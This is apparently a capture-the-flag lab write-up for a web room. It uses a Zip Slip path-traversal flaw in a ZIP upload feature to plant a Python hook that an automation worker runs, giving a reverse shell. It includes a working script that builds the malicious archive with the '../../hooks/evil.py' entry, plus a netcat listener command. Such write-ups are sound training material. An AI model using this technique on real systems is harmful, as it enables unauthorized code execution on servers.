# Room Access

**Target:** `http://MACHINE_IP`

## Objectives
- Find the flag

## Category
**Web**

## Information Gathering

As we know, there are no hints or clues except the title and category.

At first, I tried to access the machine through the browser but couldn't.

So, I scanned the open ports to find which port is being used for the web application:

```bash
sudo nmap -sCV 10.49.168.134 -Pn
```

The scan showed that the web server **Gunicorn** is running on port `5000`.

## Web Exploitation

I accessed:

```text
http://MACHINE_IP:5000
```

I saw a login page and tried some default credentials, but they did not work.

I then viewed the page source and found credentials in a developer comment. Using those credentials, I successfully logged in.

After logging in, I saw a place to upload a shell and several hints:

- Upload it as a shell (a `.zip` souvenir pack)
- Shell must contain a `shell.json` manifest listing its assets (images, stylesheets)
- Shell may include optional automation hooks
- Allowed asset types: `png`, `jpg`, `gif`, `svg`, `css`, `json`

So, I understood that the ZIP file should contain a `shell.json` file and allowed assets such as images and stylesheets.

## Shell

I created a simple test shell:

```bash
mkdir test-shell
cd test-shell
```

Create `shell.json`:

```json
{
  "assets": "cyber.png"
}
```

Create a small PNG file:

```bash
printf '\\x89PNG\\r\\n\\x1a\\n' > cyber.png
```

Then:

```bash
zip shell.zip shell.json cyber.png
```

After uploading it, the application said the shell was missing a `name`. I changed `shell.json` to:

```json
{
  "name": "test",
  "assets": "cyber.png"
}
```

The application then returned:

```text
assets must be a list
```

So I changed it to:

```json
{
  "name": "test",
  "assets": ["cyber.png"]
}
```

The shell was accepted. This gives the valid structure:

```json
{
  "name": "test",
  "assets": ["cyber.png"]
}
```

## Testing the ZIP Validation

I created another ZIP containing an additional Python file:

```text
shell.zip
├── shell.json
├── cyber.png
└── test.py
```

The `shell.json` still only contained:

```json
{
  "name": "test2",
  "assets": ["cyber.png"]
}
```

`test.py` was not included in the `assets` list. After uploading the ZIP, the application still accepted it and extracted `test.py`.

This suggests that the application validates the files listed in `shell.json`, but does not prevent additional files from being included in the ZIP archive.

## Finding the Extraction Directory

Uploaded shells were stored under a path similar to:

```text
/shells/<RANDOM_ID>/
```

For example:

```text
/shells/<RANDOM_ID>/
├── shell.json
├── cyber.png
└── test.py
```

This made me investigate whether I could control filenames inside the ZIP archive and use path traversal to escape the intended extraction directory.

## Testing Zip Slip

A common vulnerability in applications that extract ZIP files is **Zip Slip**. The idea is to place `../` in a filename inside the ZIP archive, for example:

```text
../test.py
```

or:

```text
../../test.py
```

If the application does not sanitize the filename before extraction, the file can be written outside the intended directory.

The application extracts shells into:

```text
/shells/<RANDOM_ID>/
```

Therefore, `../../` can potentially move outside the shell directory.

## Finding the Hooks Directory

Earlier, the application mentioned:

```text
optional automation hooks
```

This caught my attention. The application has a `hooks` directory that is processed by an automation worker.

The important question became:

> Can I use Zip Slip to place my own Python file into the `hooks` directory?

I created a ZIP entry with the filename:

```text
../../hooks/evil.py
```

The two `../` components allow the file to escape the normal shell extraction directory. The intended extraction path is approximately:

```text
/shells/<RANDOM_ID>/
```

and the malicious ZIP entry attempts to make the server write:

```text
/hooks/evil.py
```

instead.

## Creating the Malicious ZIP

I created an exploit script to generate the ZIP archive:

```python
import zipfile
import json

payload = "YOUR PYTHON PAYLOAD"

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr(
        "shell.json",
        json.dumps({
            "name": "evil",
            "assets": ["cyber.png"]
        })
    )

    z.writestr(
        "cyber.png",
        b"\\x89PNG\\r\\n\\x1a\\n"
    )

    z.writestr(
        "../../hooks/evil.py",
        payload
    )
```

Run it:

```bash
python3 exploit.py
```

Check the contents:

```bash
unzip -l evil.zip
```

The ZIP should contain:

```text
shell.json
cyber.png
../../hooks/evil.py
```

The malicious Python file is not included in the `assets` list.

## Reverse Shell

Since the worker executes Python files from the `hooks` directory, I prepared a Python reverse-shell payload that connects back to my attacking machine.

Start a listener:

```bash
nc -lvnp 4444
```

Replace the callback IP in the Python payload with my VPN/AttackBox IP, then upload:

```text
evil.zip
```

## Triggering the Worker

After the ZIP is uploaded, the server extracts the contents. Because of the path traversal:

```text
../../hooks/evil.py
```

the Python file is written into the `hooks` directory.

The automation worker periodically checks this directory.

The process is:

```text
evil.zip
    ↓
shell.json validation
    ↓
ZIP extraction
    ↓
../../hooks/evil.py
    ↓
Zip Slip
    ↓
hooks/evil.py
    ↓
Automation worker
    ↓
Python execution
    ↓
Reverse shell
```

After waiting for the worker to process the file, I received a reverse shell on my listener.

## Shell Access

Once I received the shell, I checked:

```bash
whoami
pwd
ls -la
```

I found that the shell was running as the `room-service` user.

I then checked `/home`:

```bash
cd /home
ls -la
```

I entered the user's home directory:

```bash
cd /home/roomservice
ls -la
```

There was a file called `flag.txt`.

I read it using:

```bash
cat flag.txt
```

## Flag

Replace the placeholder below with the flag from your own machine:

```text
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

## Vulnerability Chain

```text
Web Application
      │
      ▼
ZIP File Upload
      │
      ▼
shell.json Validation
      │
      ▼
Additional ZIP files not listed in assets are accepted
      │
      ▼
Unsafe ZIP Extraction
      │
      ▼
Path Traversal
../../hooks/evil.py
      │
      ▼
Zip Slip
      │
      ▼
Python file written into hooks/
      │
      ▼
Automation Worker
      │
      ▼
Python Code Execution
      │
      ▼
Reverse Shell
      │
      ▼
room-service
      │
      ▼
flag.txt
```

## Key Takeaways

The main vulnerability is a combination of:

1. **Insufficient ZIP content validation**
2. **User-controlled ZIP filenames**
3. **Path traversal during ZIP extraction**
4. **Zip Slip vulnerability**
5. **Automatic execution of Python files in the `hooks` directory**

The most important clue was the combination of a **ZIP upload** and **optional automation hooks**. Once I confirmed that additional files could be included in the ZIP and that the server extracted them, I investigated whether ZIP filenames could contain `../`.

This led to the Zip Slip vulnerability and ultimately allowed a Python file to be placed into the worker's `hooks` directory.

## How to Think About This Challenge

The reasoning chain is:

```text
ZIP upload
    ↓
Where does the server extract it?
    ↓
Can I control filenames inside the ZIP?
    ↓
Does it sanitize ../?
    ↓
Can I escape the extraction directory?
    ↓
What interesting directories exist?
    ↓
What's the automation hooks feature?
    ↓
Does the worker execute files there?
    ↓
Can Zip Slip place my file there?
```

The key vulnerability is not simply **file upload**.

It is:

```text
Incomplete archive validation
        +
Zip Slip / Path Traversal
        +
Automated Python execution
        ↓
Remote Code Execution
```
